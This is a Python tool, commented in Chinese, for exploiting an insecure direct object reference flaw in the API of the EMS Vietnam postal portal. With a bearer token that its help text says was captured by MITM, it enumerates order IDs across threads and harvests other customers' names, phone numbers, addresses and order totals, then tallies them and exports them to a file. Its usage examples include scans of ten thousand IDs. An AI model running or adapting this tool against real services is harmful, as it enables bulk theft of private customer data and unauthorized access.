#!/usr/bin/env python3
"""
EMS Vietnam Portal - IDOR完整利用工具
专门测试订单访问权限漏洞
"""

import requests
import json
import time
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import defaultdict

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class IDORExploit:
    def __init__(self, token, base_url="http://ws.ems.com.vn"):
        self.token = token
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "EMSPortal/4.5.7 (Android 10)"
        }
        self.results = []
        self.my_orders = []
    
    def print_banner(self):
        print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════╗
║   EMS Portal - IDOR漏洞利用工具                     ║
║   测试: 不安全的直接对象引用                        ║
╚══════════════════════════════════════════════════════╝
{Colors.RESET}
        """)
    
    def get_my_orders(self):
        """获取自己的订单ID作为参考"""
        print(f"{Colors.CYAN}[*] 获取自己的订单列表...{Colors.RESET}")
        
        try:
            url = f"{self.base_url}/api/v1/orders/list"
            r = requests.get(url, headers=self.headers, params={"limit": 20, "page": "1"}, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    orders_data = data.get('data', {})
                    orders = orders_data.get('orders', []) if isinstance(orders_data, dict) else orders_data
                    
                    if orders:
                        for order in orders:
                            order_id = order.get('id') or order.get('order_id') or order.get('_id')
                            if order_id:
                                self.my_orders.append(str(order_id))
                        
                        print(f"  {Colors.GREEN}✓ 找到 {len(self.my_orders)} 个自己的订单{Colors.RESET}")
                        print(f"  {Colors.YELLOW}示例ID: {self.my_orders[:5]}{Colors.RESET}")
                        return True
                    else:
                        print(f"  {Colors.YELLOW}⚠ 订单列表为空{Colors.RESET}")
                else:
                    print(f"  {Colors.RED}✗ 错误: {data.get('message')}{Colors.RESET}")
            else:
                print(f"  {Colors.RED}✗ HTTP {r.status_code}{Colors.RESET}")
        
        except Exception as e:
            print(f"  {Colors.RED}✗ 异常: {e}{Colors.RESET}")
        
        return False
    
    def test_order_access(self, order_id, endpoint="/api/v1/orders/tracking/{id}"):
        """测试单个订单访问"""
        url = f"{self.base_url}{endpoint.replace('{id}', str(order_id))}"
        
        try:
            r = requests.get(url, headers=self.headers, timeout=5)
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    order_data = data.get('data', {})
                    
                    # 检查是否是自己的订单
                    is_mine = str(order_id) in self.my_orders
                    
                    return {
                        'success': True,
                        'id': order_id,
                        'is_mine': is_mine,
                        'data': order_data,
                        'phone': order_data.get('phone') or order_data.get('customer_phone'),
                        'name': order_data.get('customer_name') or order_data.get('name'),
                        'address': order_data.get('address'),
                        'total': order_data.get('total') or order_data.get('amount'),
                        'status': order_data.get('status'),
                        'timestamp': datetime.now().isoformat()
                    }
                else:
                    return {
                        'success': False,
                        'id': order_id,
                        'error': data.get('message', 'Unknown error')
                    }
            else:
                return {
                    'success': False,
                    'id': order_id,
                    'error': f'HTTP {r.status_code}'
                }
        
        except Exception as e:
            return {
                'success': False,
                'id': order_id,
                'error': str(e)
            }
    
    def scan_range(self, start_id, count=100, threads=10, endpoint="/api/v1/orders/tracking/{id}"):
        """批量扫描ID范围"""
        print(f"\n{Colors.CYAN}[*] 开始IDOR扫描{Colors.RESET}")
        print(f"  端点: {endpoint}")
        print(f"  起始ID: {start_id}")
        print(f"  数量: {count}")
        print(f"  线程: {threads}")
        print()
        
        found_count = 0
        idor_count = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {}
            
            for i in range(count):
                order_id = start_id + i
                future = executor.submit(self.test_order_access, order_id, endpoint)
                futures[future] = order_id
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                order_id = futures[future]
                
                if result['success']:
                    found_count += 1
                    is_mine = result.get('is_mine', False)
                    
                    if not is_mine:
                        # IDOR! 访问到其他用户的订单
                        idor_count += 1
                        print(f"{Colors.RED}[!] IDOR! {Colors.RESET}ID={order_id} {Colors.RED}(其他用户){Colors.RESET}")
                    else:
                        print(f"{Colors.GREEN}[+] 找到{Colors.RESET} ID={order_id} {Colors.YELLOW}(自己){Colors.RESET}")
                    
                    # 显示部分数据
                    if result.get('name'):
                        print(f"    客户: {result['name']}")
                    if result.get('phone'):
                        print(f"    电话: {result['phone']}")
                    if result.get('total'):
                        print(f"    金额: {result['total']} VND")
                    
                    self.results.append(result)
                
                # 进度
                if (i + 1) % 50 == 0:
                    print(f"{Colors.CYAN}[*] 进度: {i + 1}/{count} (找到: {found_count}, IDOR: {idor_count}){Colors.RESET}")
        
        return found_count, idor_count
    
    def smart_scan(self, threads=10):
        """智能扫描 - 基于自己的订单ID推测范围"""
        if not self.my_orders:
            print(f"{Colors.YELLOW}[!] 没有参考订单ID，使用默认范围{Colors.RESET}")
            base_id = 1000000
        else:
            # 使用最小的订单ID作为起点
            base_id = int(min(self.my_orders, key=lambda x: int(x) if x.isdigit() else 0))
            print(f"{Colors.CYAN}[*] 基于订单ID {base_id} 进行智能扫描{Colors.RESET}")
        
        # 扫描前后各50个ID
        start_id = base_id - 50
        count = 100
        
        return self.scan_range(start_id, count, threads)
    
    def export_results(self, filename='idor_results.json'):
        """导出结果"""
        if not self.results:
            print(f"{Colors.YELLOW}[!] 没有结果可导出{Colors.RESET}")
            return
        
        output = {
            'scan_time': datetime.now().isoformat(),
            'total_found': len(self.results),
            'idor_count': sum(1 for r in self.results if not r.get('is_mine', True)),
            'results': self.results
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Colors.GREEN}[✓] 结果已保存到 {filename}{Colors.RESET}")
    
    def analyze_results(self):
        """分析结果"""
        if not self.results:
            print(f"{Colors.YELLOW}[!] 没有结果可分析{Colors.RESET}")
            return
        
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}IDOR分析报告{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        total = len(self.results)
        idor_results = [r for r in self.results if not r.get('is_mine', True)]
        idor_count = len(idor_results)
        
        print(f"\n{Colors.YELLOW}总览:{Colors.RESET}")
        print(f"  可访问的订单总数: {total}")
        print(f"  其中自己的订单: {total - idor_count}")
        print(f"  {Colors.RED}{Colors.BOLD}其他用户订单 (IDOR): {idor_count}{Colors.RESET}")
        
        if idor_count > 0:
            print(f"\n{Colors.RED}{Colors.BOLD}⚠ IDOR漏洞确认！可以访问其他用户的订单！{Colors.RESET}")
        else:
            print(f"\n{Colors.GREEN}✓ 未发现IDOR漏洞 (或扫描范围内无其他用户订单){Colors.RESET}")
        
        # 统计敏感信息
        phones = set()
        names = set()
        addresses = set()
        total_amount = 0
        
        for result in idor_results:
            if result.get('phone'):
                phones.add(result['phone'])
            if result.get('name'):
                names.add(result['name'])
            if result.get('address'):
                addresses.add(result['address'])
            if result.get('total'):
                try:
                    total_amount += int(result['total'])
                except:
                    pass
        
        if idor_count > 0:
            print(f"\n{Colors.YELLOW}泄露的敏感信息统计:{Colors.RESET}")
            print(f"  唯一电话号码: {len(phones)}")
            print(f"  唯一客户姓名: {len(names)}")
            print(f"  唯一地址: {len(addresses)}")
            print(f"  订单总金额: {total_amount:,} VND")
            
            # 显示样例
            if idor_results:
                print(f"\n{Colors.YELLOW}IDOR样例数据:{Colors.RESET}")
                sample = idor_results[0]
                print(f"  订单ID: {sample['id']}")
                print(f"  客户: {sample.get('name', 'N/A')}")
                print(f"  电话: {sample.get('phone', 'N/A')}")
                print(f"  地址: {sample.get('address', 'N/A')[:50]}...")
                print(f"  金额: {sample.get('total', 'N/A')} VND")

def main():
    parser = argparse.ArgumentParser(
        description='EMS Portal IDOR Exploit Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 基础测试 (智能扫描)
  python3 idor_exploit.py --token "YOUR_TOKEN"
  
  # 指定范围
  python3 idor_exploit.py --token "YOUR_TOKEN" --start 1000000 --count 200
  
  # 大规模扫描
  python3 idor_exploit.py --token "YOUR_TOKEN" --start 1000000 --count 10000 --threads 50
  
  # 测试其他端点
  python3 idor_exploit.py --token "YOUR_TOKEN" --endpoint "/api/v1/grab/status/{id}"
        """
    )
    
    parser.add_argument('--token', required=True, help='Bearer Token (从MITM获取)')
    parser.add_argument('--start', type=int, help='起始订单ID (不指定则智能推测)')
    parser.add_argument('--count', type=int, default=100, help='扫描数量 (默认: 100)')
    parser.add_argument('--threads', type=int, default=10, help='并发线程数 (默认: 10)')
    parser.add_argument('--endpoint', default='/api/v1/orders/tracking/{id}', help='测试端点')
    parser.add_argument('--output', default='idor_results.json', help='输出文件')
    
    args = parser.parse_args()
    
    exploit = IDORExploit(args.token)
    exploit.print_banner()
    
    # 1. 获取自己的订单作为参考
    exploit.get_my_orders()
    
    # 2. 扫描
    if args.start:
        found, idor = exploit.scan_range(args.start, args.count, args.threads, args.endpoint)
    else:
        found, idor = exploit.smart_scan(args.threads)
    
    # 3. 分析
    exploit.analyze_results()
    
    # 4. 导出
    exploit.export_results(args.output)
    
    # 总结
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] 扫描完成!{Colors.RESET}")
    print(f"  找到订单: {found}")
    print(f"  {Colors.RED}IDOR (其他用户): {idor}{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")

if __name__ == '__main__':
    main()
